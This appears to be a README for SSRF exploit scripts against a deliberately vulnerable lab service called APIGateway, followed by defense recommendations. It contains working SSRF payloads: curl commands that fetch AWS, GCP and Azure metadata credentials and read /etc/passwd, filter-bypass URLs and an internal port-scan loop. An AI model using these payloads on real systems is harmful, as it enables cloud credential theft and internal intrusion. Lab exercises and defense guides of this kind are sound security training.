# APIGateway - Server-Side Request Forgery (SSRF) Exploits

## Overview
These exploits target the APIGateway's SSRF vulnerability in the proxy endpoint, allowing access to internal services and cloud metadata.

## Target Application
- **Project**: APIGateway
- **Port**: 5004
- **Vulnerable Endpoint**: `/proxy`
- **Vulnerability**: Unrestricted URL fetching

## Prerequisites
```bash
# Ensure APIGateway is running
docker-compose up -d apigateway
```

## Exploits

### ssrf_cloud_metadata.py
Exploits SSRF to access cloud provider metadata services.

**Usage:**
```bash
python3 ssrf_cloud_metadata.py
```

**Customization:**
Edit the script to target different endpoints:
```python
# AWS metadata
url = "http://169.254.169.254/latest/meta-data/"

# Google Cloud metadata
url = "http://metadata.google.internal/computeMetadata/v1/"

# Azure metadata
url = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Internal services
url = "http://localhost:5001/admin"
url = "http://securedoc:5000/internal"
```

**What it does:**
- Sends requests through the APIGateway proxy
- Accesses cloud provider metadata APIs (AWS, GCP, Azure)
- Can retrieve IAM credentials, instance info, user data
- Can scan internal network services

**Expected Output (AWS):**
```
[+] Targeting: http://localhost:5004/proxy
[+] SSRF URL: http://169.254.169.254/latest/meta-data/
[+] Response:
ami-id
instance-id
iam/security-credentials/
...
```

**Expected Output (Internal Service):**
```
[+] Targeting internal service via SSRF
[+] URL: http://securedoc:5000/admin
[+] Response: 
<!DOCTYPE html>
<html>Admin Panel - Access Granted</html>
```

## Advanced SSRF Techniques

### 1. Port Scanning
```bash
# Modify script to scan internal ports:
for port in range(1, 1000):
    url = f"http://localhost:{port}"
    # Send SSRF request...
```

### 2. Protocol Smuggling
```bash
# Access file:// protocol (if not filtered)
curl "http://localhost:5004/proxy?url=file:///etc/passwd"

# Access internal services
curl "http://localhost:5004/proxy?url=http://securedoc:5000/admin"
```

### 3. Bypassing Filters
```bash
# URL encoding
curl "http://localhost:5004/proxy?url=http%3A%2F%2F169.254.169.254"

# Alternative representations
curl "http://localhost:5004/proxy?url=http://0x7f000001"  # 127.0.0.1
curl "http://localhost:5004/proxy?url=http://127.1"       # Short form
```

## Cloud Metadata Exploitation

### AWS IMDSv1 (Vulnerable)
```bash
# Get IAM role credentials
python3 ssrf_cloud_metadata.py

# Manual:
curl "http://localhost:5004/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://localhost:5004/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
```

### Google Cloud Metadata
```bash
# Manual (requires header but some SSRF allow it):
curl "http://localhost:5004/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

## Defense Recommendations

### 1. URL Whitelist
```python
ALLOWED_DOMAINS = ['api.example.com', 'partner.example.com']

def validate_url(url):
    parsed = urllib.parse.urlparse(url)
    return parsed.netloc in ALLOWED_DOMAINS
```

### 2. Block Private IP Ranges
```python
import ipaddress

def is_private_ip(hostname):
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except ValueError:
        # Resolve hostname to IP
        ip = socket.gethostbyname(hostname)
        return is_private_ip(ip)
```

### 3. Network Segmentation
```yaml
# docker-compose.yml
networks:
  public:
    driver: bridge
  internal:
    driver: bridge
    internal: true  # No external access
```

### 4. Cloud Metadata Protection
```bash
# AWS: Use IMDSv2 (requires token)
# Add to EC2 user data or launch template:
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

## Notes
**WARNING**: SSRF can lead to:
- Cloud credential theft
- Internal network reconnaissance
- Access to restricted services
- Data exfiltration from internal APIs

**Impact in Cloud Environments:**
- AWS: IAM role credentials, EC2 metadata
- GCP: Service account tokens
- Azure: Managed identity tokens
- Kubernetes: Service account tokens from metadata API

## Related Exploits
- See `../rce/` for escalating from SSRF to RCE
- Combine with other internal service exploits after SSRF access
